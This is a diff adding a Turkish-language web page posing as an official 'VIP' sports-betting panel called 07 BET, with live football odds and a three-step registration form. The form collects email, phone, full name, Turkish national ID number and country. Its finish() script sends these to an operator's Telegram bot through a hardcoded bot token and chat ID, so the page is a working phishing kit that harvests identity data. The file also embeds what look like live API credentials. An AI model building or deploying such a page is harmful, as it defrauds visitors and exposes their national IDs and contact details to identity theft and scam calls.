@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>07 BET | Resmi VIP Panel</title>
+    <link href="https://fonts.googleapis.com/css2?family=Oswald:wght@700&family=Poppins:wght@400;600;900&display=swap" rel="stylesheet">
+    <style>
+        :root { --gold: #ffcc00; --bg: #050a0f; --card: #111a24; --green: #2ecc71; --blue: #3498db; }
+        body { background: var(--bg); color: #fff; font-family: 'Poppins', sans-serif; margin: 0; padding-bottom: 70px; overflow-x: hidden; }
+        
+        /* Header */
+        header { 
+            background: #050a0f; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center;
+            border-bottom: 2px solid var(--gold); position: sticky; top: 0; z-index: 9999;
+        }
+        .logo { font-family: 'Oswald', sans-serif; font-size: 28px; color: var(--gold); font-style: italic; }
+        .reg-btn { background: var(--green); color: #000; border: none; padding: 10px 20px; border-radius: 6px; font-weight: 900; cursor: pointer; }
+
+        /* Banner */
+        .hero { 
+            height: 180px; background: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.5)), url('https://images.unsplash.com/photo-1596743444221-60154f0f8083?q=80&w=1000') center/cover;
+            display: flex; align-items: center; justify-content: center; border-bottom: 2px solid var(--blue);
+        }
+        .hero h1 { font-family: 'Oswald', sans-serif; font-size: 28px; color: var(--gold); text-shadow: 2px 2px 10px #000; }
+
+        /* 3 Adımlı Modal */
+        #regModal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 100000; justify-content: center; align-items: center; }
+        .modal-box { background: var(--card); width: 90%; max-width: 400px; padding: 25px; border-radius: 20px; border: 2px solid var(--gold); max-height: 85vh; overflow-y: auto; }
+        
+        .steps { display: flex; justify-content: space-between; margin-bottom: 20px; }
+        .s-line { flex: 1; height: 4px; background: #2c3e50; margin: 0 4px; border-radius: 2px; }
+        .s-line.active { background: var(--gold); box-shadow: 0 0 8px var(--gold); }
+
+        .part { display: none; }
+        .part.active { display: block; animation: fadeIn 0.3s; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        label { display: block; font-size: 11px; color: var(--gold); margin: 12px 0 5px 0; font-weight: bold; }
+        input, select, textarea { width: 100%; padding: 12px; background: #000; border: 1px solid #2c3e50; color: #fff; border-radius: 8px; box-sizing: border-box; font-size: 14px; }
+        
+        .nav-btns { display: flex; gap: 10px; margin-top: 20px; }
+        .btn-m { flex: 1; padding: 15px; border-radius: 8px; font-weight: 900; cursor: pointer; border: none; }
+        .next-v { background: var(--gold); color: #000; }
+        .prev-v { background: #34495e; color: #fff; }
+
+        /* Spor Kartları */
+        .m-card { background: var(--card); margin: 15px; padding: 15px; border-radius: 12px; border: 1px solid #1e2d3d; }
+        .teams { display: flex; justify-content: space-between; font-weight: 900; margin-top: 5px; }
+        .odds { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-top: 15px; }
+        .odd { background: #050a0f; border: 1px solid #2c3e50; padding: 10px; text-align: center; color: var(--blue); border-radius: 6px; font-weight: bold; }
+
+        nav { position: fixed; bottom: 0; width: 100%; background: #050a0f; display: flex; justify-content: space-around; padding: 12px 0; border-top: 1px solid var(--gold); }
+    </style>
+</head>
+<body>
+
+<header>
+    <div class="logo">07 BET</div>
+    <button class="reg-btn" onclick="openM()">KAYIT OL</button>
+</header>
+
+<div class="hero">
+    <h1>VIP KAZANÇ DÜNYASI</h1>
+</div>
+
+<div id="sport-odds"><div style="text-align:center; padding:50px;">Bülten yükleniyor...</div></div>
+
+<div id="regModal">
+    <div class="modal-box">
+        <div class="steps">
+            <div class="s-line active" id="l1"></div>
+            <div class="s-line" id="l2"></div>
+            <div class="s-line" id="l3"></div>
+        </div>
+
+        <div class="part active" id="p1">
+            <h3 style="color:var(--gold); margin:0;">1. Adım: İletişim</h3>
+            <label>E-POSTA</label><input type="email" id="uMail" placeholder="ornek@mail.com">
+            <label>TELEFON</label><input type="tel" id="uTel" placeholder="05XX XXX XX XX">
+            <div class="nav-btns"><button class="btn-m next-v" onclick="move(2)">DEVAM ET</button></div>
+        </div>
+
+        <div class="part" id="p2">
+            <h3 style="color:var(--gold); margin:0;">2. Adım: Kişisel</h3>
+            <div style="display:flex; gap:5px;">
+                <div style="flex:1;"><label>İSİM</label><input type="text" id="uName"></div>
+                <div style="flex:1;"><label>SOYİSİM</label><input type="text" id="uSname"></div>
+            </div>
+            <label>TC KİMLİK</label><input type="number" id="uTc">
+            <label>DOĞUM TARİHİ</label><input type="date" id="uDate">
+            <label>ADRES</label><textarea id="uAddr" rows="2"></textarea>
+            <label>CİNSİYET</label><select id="uGen"><option>Erkek</option><option>Kadın</option></select>
+            <div class="nav-btns">
+                <button class="btn-m prev-v" onclick="move(1)">GERİ</button>
+                <button class="btn-m next-v" onclick="move(3)">DEVAM ET</button>
+            </div>
+        </div>
+
+        <div class="part" id="p3">
+            <h3 style="color:var(--gold); margin:0;">3. Adım: Ayarlar</h3>
+            <label>ÜLKE</label><select id="uCount"><option>Türkiye</option><option>Almanya</option><option>İngiltere</option><option>Azerbaycan</option></select>
+            <label>PARA BİRİMİ</label><select id="uCurr"><option>TRY</option><option>USD</option><option>EUR</option></select>
+            <div style="margin-top:15px; font-size:12px; color:#7f8c8d;">
+                <input type="checkbox" id="uCheck" style="width:18px; height:18px; vertical-align:middle;"> Sözleşmeyi kabul ediyorum.
+            </div>
+            <div class="nav-btns">
+                <button class="btn-m prev-v" onclick="move(2)">GERİ</button>
+                <button class="btn-m next-v" style="background:var(--green)" onclick="finish()">TAMAMLA</button>
+            </div>
+        </div>
+        <button onclick="closeM()" style="background:none; border:none; color:gray; width:100%; margin-top:15px; cursor:pointer;">Vazgeç</button>
+    </div>
+</div>
+
+<nav>
+    <span style="color:var(--gold)">🏆<br>Spor</span>
+    <span>🎰<br>Slot</span>
+    <span>💰<br>Finans</span>
+    <span>👤<br>Profil</span>
+</nav>
+
+<script>
+    const B_T = "8334170490:AAEoym3kRcAdRGRjlNeXP8CvhanLAArzm9s";
+    const C_I = "52504489"; // Görüntüden alınan kesin Chat ID
+
+    function openM() { document.getElementById('regModal').style.display = 'flex'; }
+    function closeM() { document.getElementById('regModal').style.display = 'none'; }
+
+    function move(s) {
+        document.querySelectorAll('.part').forEach(x => x.classList.remove('active'));
+        document.querySelectorAll('.s-line').forEach(x => x.classList.remove('active'));
+        document.getElementById('p'+s).classList.add('active');
+        for(let i=1; i<=s; i++) document.getElementById('l'+i).classList.add('active');
+    }
+
+    async function finish() {
+        if(!document.getElementById('uCheck').checked) return alert("Sözleşmeyi onaylayın!");
+        const d = {
+            m: document.getElementById('uMail').value,
+            t: document.getElementById('uTel').value,
+            n: document.getElementById('uName').value + " " + document.getElementById('uSname').value,
+            tc: document.getElementById('uTc').value,
+            c: document.getElementById('uCount').value
+        };
+        const text = `🚀 **YENİ KAYIT**\n👤: ${d.n}\n📞: ${d.t}\n📧: ${d.m}\n🆔: ${d.tc}\n🌍: ${d.c}`;
+        
+        try {
+            const res = await fetch(`https://api.telegram.org/bot${B_T}/sendMessage?chat_id=${C_I}&text=${encodeURIComponent(text)}`);
+            if(res.ok) { alert("BAŞARILI! VIP temsilciniz sizi arayacak."); location.reload(); }
+            else { alert("Hata! Botu Telegram'dan başlatın."); }
+        } catch(e) { alert("Bağlantı hatası!"); }
+    }
+
+    async function getOdds() {
+        try {
+            const r = await fetch('https://api.the-odds-api.com/v4/sports/soccer/odds/?apiKey=391055381f29a3f06b05c67516181c59&regions=eu');
+            const data = await r.json();
+            const div = document.getElementById('sport-odds');
+            div.innerHTML = '';
+            data.slice(0, 10).forEach(m => {
+                const o = m.bookmakers[0].markets[0].outcomes;
+                div.innerHTML += `<div class="m-card">
+                    <div style="font-size:11px; color:gray;">⚽ ${m.sport_title}</div>
+                    <div class="teams"><span>${m.home_team}</span> <span>${m.away_team}</span></div>
+                    <div class="odds"><div class="odd">1: ${o[0].price}</div><div class="odd">X: ${o[1].price}</div><div class="odd">2: ${o[2].price}</div></div>
+                </div>`;
+            });
+        } catch(e) { console.log(e); }
+    }
+    getOdds();
+</script>
+</body>
+</html>
